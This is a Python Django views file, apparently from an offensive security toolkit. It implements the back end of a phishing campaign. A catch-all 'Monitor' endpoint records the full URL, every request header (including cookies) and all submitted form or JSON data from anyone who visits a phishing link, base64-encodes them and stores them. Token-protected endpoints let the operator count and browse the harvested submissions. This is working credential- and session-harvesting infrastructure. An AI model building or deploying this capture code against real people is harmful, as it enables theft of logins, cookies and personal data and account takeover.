#!/usr/bin/env python
# -*- coding: utf-8 -*-
from django.http import HttpResponse,JsonResponse
from ClassCongregation import ErrorLog
import json
import base64
from Web.WebClassCongregation import FishingData,UserInfo
from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
import re
"""
http://127.0.0.1:9999/b/aaaaaaaaaa/?dasd=dasd
"""
def Monitor(request,data):#用于接收信息的监控
    RequestLogRecord(request, request_api="email")
    GetRequestFragment=""
    try:#正则匹配获取项XSS目生成文件名
        GetRequestFragment = re.search(r'/[a-zA-Z0-9]{10}', str(request.get_full_path), re.I).group(0)  # 对URL进行提取处理
        #print(GetRequestFragment[1:11])
    except Exception as e:
        ErrorLog().Write("Web_Mail_FishingData_Monitor(def)-GetRequestFragment", e)

    if request.method == "POST":
        try:

            if request.headers["Content-Type"]=="application/json":
                DataPackInfo = request.body#获取post数据包信息
            else:
                DataPackInfo = str(request.POST.dict()).encode('utf-8')#转换成字典后再换装byte类型穿给加密函数
            HeadersInfo = str(request.headers).encode('utf-8')#获取头信息
            FishingData().Write(full_url=str(request.build_absolute_uri()),
                                request_method="POST",request_key=GetRequestFragment[1:11],headers_info=base64.b64encode(HeadersInfo).decode('utf-8'),data_pack_info=base64.b64encode(DataPackInfo).decode('utf-8'))
        except Exception as e:
            ErrorLog().Write("Web_Mail_FishingData_Monitor(def)-POST", e)
    elif request.method == "GET":
        try:
            ParameterInfo=str(request.GET.dict()).encode('utf-8')#获取参数信息
            HeadersInfo=str(request.headers).encode('utf-8')#获取头信息
            FishingData().Write(full_url=str(request.build_absolute_uri()),
                                request_method="GET",request_key=GetRequestFragment[1:11],headers_info=base64.b64encode(HeadersInfo).decode('utf-8'),data_pack_info=base64.b64encode(ParameterInfo).decode('utf-8'))

        except Exception as e:
            ErrorLog().Write("Web_Mail_FishingData_Monitor(def)-GET", e)

    return HttpResponse("")


"""fishing_data_statistics
{
	"token": "xxx",
	"request_key":"aaaaaaaaaa"
}
"""
def FishingDataStatistics(request):#统计钓鱼获取到的数据
    RequestLogRecord(request, request_api="fishing_data_statistics")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            RequestKey = json.loads(request.body)["request_key"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="fishing_data_statistics", uid=Uid)  # 查询到了在计入
                Result=FishingData().Quantity(request_key=RequestKey)
                return JsonResponse({'message': Result, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_Mail_FishingData_FishingDataStatistics(def)", e)
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""fishing_data_details
{
	"token": "xxx",
	"request_key":"aaaaaaaaaa",
	"number_of_pages":"1"
}
"""
def FishingDataDetails(request):#钓鱼获取的数据详情
    RequestLogRecord(request, request_api="fishing_data_details")
    if request.method == "POST":
        try:
            Token=json.loads(request.body)["token"]
            RequestKey = json.loads(request.body)["request_key"]
            NumberOfPages=json.loads(request.body)["number_of_pages"]
            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="fishing_data_details", uid=Uid)  # 查询到了在计入
                if int(NumberOfPages)>0:
                    Result=FishingData().Query(request_key=RequestKey,number_of_pages=int(NumberOfPages))
                    return JsonResponse({'message': Result, 'code': 200, })
                else:
                    return JsonResponse({'message': "你家页数是负数的？？？？", 'code': 400, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_Mail_FishingData_FishingDataDetails(def)", e)
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })
